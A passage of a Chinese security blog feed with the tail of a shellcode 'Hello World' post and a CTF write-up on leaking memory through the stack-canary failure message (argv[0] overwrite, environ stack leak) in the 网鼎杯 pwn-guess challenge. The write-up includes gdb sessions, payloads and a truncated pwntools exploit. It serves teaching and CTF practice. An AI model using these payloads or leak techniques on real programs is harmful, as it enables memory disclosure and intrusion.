class="number">0x50</span>,main11=<span class="number">0x48</span>,main12=<span class="number">0xb8</span>,main13=<span class="number">0x67</span>,main14=<span class="number">0x2e</span>,main15=<span class="number">0x67</span>,main16=<span class="number">0x6d</span>,main17=<span class="number">0x60</span>,main18=<span class="number">0x66</span>,main19=<span class="number">0x1</span>,main20=<span class="number">0x1</span>,main21=<span class="number">0x48</span>,main22=<span class="number">0x31</span>,main23=<span class="number">0x4</span>,main24=<span class="number">0x24</span>,main25=<span class="number">0x48</span>,main26=<span class="number">0xb8</span>,main27=<span class="number">0x2f</span>,main28=<span class="number">0x68</span>,main29=<span class="number">0x6f</span>,main30=<span class="number">0x6d</span>,main31=<span class="number">0x65</span>,main32=<span class="number">0x2f</span>,main33=<span class="number">0x63</span>,main34=<span class="number">0x74</span>,main35=<span class="number">0x50</span>,main36=<span class="number">0x48</span>,main37=<span class="number">0x89</span>,main38=<span class="number">0xe7</span>,main39=<span class="number">0x31</span>,main40=<span class="number">0xd2</span>,main41=<span class="number">0x31</span>,main42=<span class="number">0xf6</span>,main43=<span class="number">0x6a</span>,main44=<span class="number">0x2</span>,main45=<span class="number">0x58</span>,main46=<span class="number">0xf</span>,main47=<span class="number">0x5</span>,main48=<span class="number">0x31</span>,main49=<span class="number">0xc0</span>,main50=<span class="number">0x6a</span>,main51=<span class="number">0x3</span>,main52=<span class="number">0x5f</span>,main53=<span class="number">0x6a</span>,main54=<span class="number">0x20</span>,main55=<span class="number">0x5a</span>,main56=<span class="number">0x48</span>,main57=<span class="number">0x89</span>,main58=<span class="number">0xe6</span>,main59=<span class="number">0xf</span>,main60=<span class="number">0x5</span>,main61=<span class="number">0x6a</span>,main62=<span class="number">0x1</span>,main63=<span class="number">0x5f</span>,main64=<span class="number">0x6a</span>,main65=<span class="number">0x20</span>,main66=<span class="number">0x5a</span>,main67=<span class="number">0x48</span>,main68=<span class="number">0x89</span>,main69=<span class="number">0xe6</span>,main70=<span class="number">0x6a</span>,main71=<span class="number">0x1</span>,main72=<span class="number">0x58</span>,main73=<span class="number">0xf</span>,main74=<span class="number">0x5</span>;</span><br></pre></td></tr></table></figure><p>参考：</p><p>有趣的”Hello World”</p><p><a href="https://www.dazhuanlan.com/2020/03/03/5e5d97d48a85f/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2020/03/03/5e5d97d48a85f/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 前段时间在逛知乎的时候，偶然发现一道有意思的编程题&lt;br&gt;&lt;img alt=&quot;知乎&quot; data-src=&quot;https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbq
      
    
    </summary>
    
      <category term="c" scheme="https://nocbtm.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>__stack_chk_fail相关利用</title>
    <link href="https://nocbtm.github.io/2020/04/28/stack-chk-fail%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/28/stack-chk-fail相关利用/</id>
    <published>2020-04-28T03:27:57.000Z</published>
    <updated>2020-04-29T16:16:56.202Z</updated>
    
    <content type="html"><![CDATA[<p>在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。</p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="1-Stack-smash"><a href="#1-Stack-smash" class="headerlink" title="1. Stack smash"></a>1. Stack smash</h2><p>Linux 系统中，为了防御栈溢出漏洞的利用，通常会部署 Canary 漏洞缓解措施。Wiki 中对 Canary 的解释如下：</p><blockquote><p>Canaries or canary words are known values that are placed between a buffer and control data on the stack to monitor buffer overflows. When the buffer overflows, the first data to be corrupted will usually be the canary, and a failed verification of the canary data will therefore alert of an overflow, which can then be handled, for example, by invalidating the corrupted data.</p></blockquote><p>下面简单描述下 Canary 的原理。对于栈溢出漏洞的利用，最简单的方法就是通过溢出数据修改栈中函数返回地址为目标内存地址，当函数返回时将会跳转到目标内存处执行指令，从而实现控制流劫持。为了防御这种利用方法，分配栈空间时在 EBP-4 的位置存放一个 Canary 值，函数返回之前会校验该值是否被修改，若检测到被修改则调用 <code>__stack_chk_fail</code> 函数抛出异常并结束进程。可见，要覆盖函数返回地址必须修改 Canary，从而可防御该攻击方法。gcc 编译器默认开启该缓解机制，编译时可用 <code>-fno-stack-protector</code> 选项关闭该机制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> Low Address |                 |</span><br><span class="line">             +-----------------+</span><br><span class="line">     esp =&gt;  | local variables |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[0-3]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[4-7]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     canary      |</span><br><span class="line">             +-----------------+</span><br><span class="line">     ebp =&gt;  |     old ebp     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |   return addr   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |      args       |</span><br><span class="line">             +-----------------+</span><br><span class="line">High Address |                 |</span><br></pre></td></tr></table></figure><p>libc 中 <code>__stack_chk_fail</code> 的源码如下，该函数调用 <code>__fortify_fail</code> 输出异常信息，其中包含 libc_argv[0] 指向的程序名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若通过栈溢出漏洞可修改栈内存中 argv[0] 指针，那么触发 Stack smash 时可泄露内存信息。例如把 argv[0] 修改为 got 表项可泄露出内存中函数地址，为进一步利用提供条件。</p><h2 id="2-environ"><a href="#2-environ" class="headerlink" title="2. environ"></a>2. environ</h2><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm      Name</span><br><span class="line">0x00400000         0x00401000         r-xp      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00601000         0x00602000         r--p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00602000         0x00603000         rw-p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 rw-p      mapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p      [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]</span><br><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdc98</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdc98</span><br><span class="line">0000| 0x7fffffffdc98 --&gt; 0x7fffffffe0ae (&quot;XDG_SESSION_ID=c2&quot;)</span><br><span class="line">0008| 0x7fffffffdca0 --&gt; 0x7fffffffe0c0 (&quot;QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1&quot;)</span><br><span class="line">0016| 0x7fffffffdca8 --&gt; 0x7fffffffe0e3 (&quot;UNITY_DEFAULT_PROFILE=unity&quot;)</span><br><span class="line">0024| 0x7fffffffdcb0 --&gt; 0x7fffffffe0ff (&quot;GNOME_KEYRING_PID=&quot;)</span><br><span class="line">0032| 0x7fffffffdcb8 --&gt; 0x7fffffffe112 (&quot;GNOME_KEYRING_CONTROL=&quot;)</span><br><span class="line">0040| 0x7fffffffdcc0 --&gt; 0x7fffffffe129 (&quot;DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path&quot;)</span><br><span class="line">0048| 0x7fffffffdcc8 --&gt; 0x7fffffffe15c (&quot;LOGNAME=lc&quot;)</span><br><span class="line">0056| 0x7fffffffdcd0 --&gt; 0x7fffffffe167 (&quot;INSTANCE=&quot;)</span><br></pre></td></tr></table></figure><h1 id="实例分析-网鼎杯-pwn-guess"><a href="#实例分析-网鼎杯-pwn-guess" class="headerlink" title="实例分析  网鼎杯 pwn-guess"></a>实例分析  网鼎杯 pwn-guess</h1><p>下面通过调试 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/stack_smash" target="_blank" rel="noopener">网鼎杯的 pwn-GUESS</a> 的利用过程说明 Stack smash 利用方法。</p><h2 id="1-漏洞位置"><a href="#1-漏洞位置" class="headerlink" title="1. 漏洞位置"></a>1. 漏洞位置</h2><p>程序首先将 flag 读入内存中的 buf，用户有 3 次猜测 flag 的机会。通过 gets() 读取用户输入时存在栈溢出漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">  gets(&amp;s2);         // overflow</span><br><span class="line">  if ( !strcmp(&amp;buf, &amp;s2) )</span><br><span class="line">    puts(&quot;You must have great six sense!!!! :-o &quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><p>首先查看程序开启的漏洞缓解机制，发现已开启 Canary 和 NX，未开启 PIE。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure><p>由于程序中 sub_400A11() 函数使用 fork 子进程的方式允许用户有 3 次猜测 flag 的机会，同时又将 flag 读入栈中，因此可利用 Stack smash 进行 3 次内存泄漏获得 flag。具体利用思路如下：</p><ul><li>通过栈溢出漏洞覆盖 argv[0] 为 <code>__libc_start_main</code> 的 got 表项，触发 Stack smash 可泄露 <code>__libc_start_main</code> 函数地址，利用给出的 libc 文件可计算得到 libc 基地址；</li><li>计算出 environ 在内存中的地址，第二次利用栈溢出漏洞覆盖 argv[0] 为 <code>environ</code> ，泄露出 environ 的值，即指向环境变量的栈地址；</li><li>根据栈内存中 flag 与 environ 值的偏移量计算出 flag 的栈地址，再次利用栈溢出漏洞覆盖 argv[0] 为 flag 的栈地址，从而可读取 flag 的值。</li></ul><h3 id="1）泄露-libc-基址"><a href="#1）泄露-libc-基址" class="headerlink" title="1）泄露 libc 基址"></a>1）泄露 libc 基址</h3><p>首先，从下图栈内存信息可知缓冲区 s2 地址为 0x7fffffffdb60， argv[0] 地址为 0x7fffffffdc88，从而可计算出 s2 与 argv[0] 间的偏移量为 0x128（0x7fffffffdc88-0x7fffffffdb60）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400b1b:    mov    rdi,rax</span><br><span class="line">   0x400b1e:    mov    eax,0x0</span><br><span class="line">   0x400b23:    call   0x400830 &lt;gets@plt&gt;</span><br><span class="line">=&gt; 0x400b28:    lea    rdx,[rbp-0x40]</span><br><span class="line">   0x400b2c:    lea    rax,[rbp-0x70]</span><br><span class="line">   0x400b30:    mov    rsi,rdx</span><br><span class="line">   0x400b33:    mov    rdi,rax</span><br><span class="line">   0x400b36:    call   0x400820 &lt;strcmp@plt&gt;</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0000000000400b28 in ?? ()</span><br><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0x7fffffffdb00 --&gt; 0x7fffffffdc88 --&gt; 0x7fffffffe091 (&quot;/home/lc/Desktop/guess/guess&quot;)</span><br><span class="line">0008| 0x7fffffffdb08 --&gt; 0x100000000 </span><br><span class="line">0016| 0x7fffffffdb10 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdb18 --&gt; 0x3 </span><br><span class="line">0032| 0x7fffffffdb20 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdb28 --&gt; 0x3 </span><br><span class="line">0048| 0x7fffffffdb30 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0056| 0x7fffffffdb38 (&quot;61991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0064| 0x7fffffffdb40 (&quot;943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0072| 0x7fffffffdb48 (&quot;57863eec75961&#125;\n&quot;)</span><br><span class="line">0080| 0x7fffffffdb50 --&gt; 0xa7d3136393537 (&apos;75961&#125;\n&apos;)</span><br><span class="line">0088| 0x7fffffffdb58 --&gt; 0x0 </span><br><span class="line">0096| 0x7fffffffdb60 (&apos;A&apos; &lt;repeats 16 times&gt;)</span><br><span class="line">0104| 0x7fffffffdb68 (&quot;AAAAAAAA&quot;)</span><br><span class="line">0112| 0x7fffffffdb70 --&gt; 0x0</span><br></pre></td></tr></table></figure><p>因此可构造以下 payload 将 argv[0] 覆盖为 <code>__libc_start_main</code> 的 got 表项，可泄露出 <code>__libc_start_main</code> 函数在内存中的地址，从而计算出 libc 的基址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;A&apos; * 0x128 + p64(libc_start_main_got)</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[&apos;__libc_start_main&apos;]</span><br></pre></td></tr></table></figure><p>泄露出 libc 基址为 0x7ffff7a0d000。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  40 d7 a2 f7  ff 7f 20 74  │ed *│**: │@···│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">libc_base_addr = 0x7ffff7a0d000</span><br></pre></td></tr></table></figure><h3 id="2）泄露-environ"><a href="#2）泄露-environ" class="headerlink" title="2）泄露 environ"></a>2）泄露 environ</h3><p>构造以下 payload，第二次利用栈溢出将 argv[0] 覆盖为 <code>environ</code> 的地址，从而泄露出 <code>environ</code> 的值，该值为执行环境变量的栈地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">environ_addr = libc_base_addr + libc.symbols[&apos;_environ&apos;]</span><br><span class="line">payload1 = &apos;A&apos; * 0x128 + p64(environ_addr)</span><br></pre></td></tr></table></figure><p>泄露出 <code>environ</code> 的值为 0x7fffffffdcf8。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  f8 dc ff ff  ff 7f 20 74  │ed *│**: │····│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">stack_addr = 0x7fffffffdcf8</span><br></pre></td></tr></table></figure><p>可在 gdb 中验证该值为正确的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdcf8</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdcf8</span><br><span class="line">0000| 0x7fffffffdcf8 --&gt; 0x7fffffffe0ea (&quot;INSTANCE=&quot;)</span><br><span class="line">0008| 0x7fffffffdd00 --&gt; 0x7fffffffe0f4 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)</span><br><span class="line">0016| 0x7fffffffdd08 --&gt; 0x7fffffffe12a (&quot;ALL_PROXY=socks://192.168.239.1:1080/&quot;)</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure><h3 id="3）读取-flag"><a href="#3）读取-flag" class="headerlink" title="3）读取 flag"></a>3）读取 flag</h3><p>查看内存中 flag 的地址为 0x7fffffffdb90，计算该地址与泄露栈地址的偏移量为 0x168（0x7fffffffdcf8 - 0x7fffffffdb90）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20                                                                                                                                             </span><br><span class="line">0000| 0x7fffffffdb08 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:  cmp    rax,0x0)</span><br><span class="line">0008| 0x7fffffffdb10 --&gt; 0x7ffff7dd3780 --&gt; 0x0 </span><br><span class="line">     ...</span><br><span class="line">0088| 0x7fffffffdb60 --&gt; 0x7fffffffdce8 --&gt; 0x7fffffffe0e2 --&gt; 0x73736575672f2e (&apos;./guess&apos;)</span><br><span class="line">0096| 0x7fffffffdb68 --&gt; 0x100000000 </span><br><span class="line">0104| 0x7fffffffdb70 --&gt; 0x8600000000 </span><br><span class="line">0112| 0x7fffffffdb78 --&gt; 0x3 </span><br><span class="line">0120| 0x7fffffffdb80 --&gt; 0x2 </span><br><span class="line">0128| 0x7fffffffdb88 --&gt; 0x3 </span><br><span class="line">0136| 0x7fffffffdb90 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">     ...</span><br></pre></td></tr></table></figure><p>构造以下 payload，第三次利用栈溢出覆盖 argv[0] 为 flag 的内存地址，从而可读取内存中的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = &apos;A&apos; * 0x128 + p64(stack_addr - 0x168)</span><br></pre></td></tr></table></figure><p>最终获取 flag 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x9b bytes:</span><br><span class="line">    &apos;You should take more effort to get six sence, and one more challenge!!\n&apos;</span><br><span class="line">    &apos;*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;\n&apos;</span><br><span class="line">    &apos; terminated\n&apos;</span><br><span class="line">You should take more effort to get six sence, and one more challenge!!</span><br><span class="line">*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;</span><br><span class="line"> terminated</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./guess'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_got = <span class="number">0x602048</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x400B23)    </span></span><br><span class="line"><span class="comment">#raw_input("leak libc_base")</span></span><br><span class="line">p.recvuntil(<span class="string">'guessing flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(libc_start_main_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">libc_start_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base_addr = '</span> + hex(libc_base_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak environ_addr")</span></span><br><span class="line">environ_addr = libc_base_addr + libc.symbols[<span class="string">'_environ'</span>]</span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(environ_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span 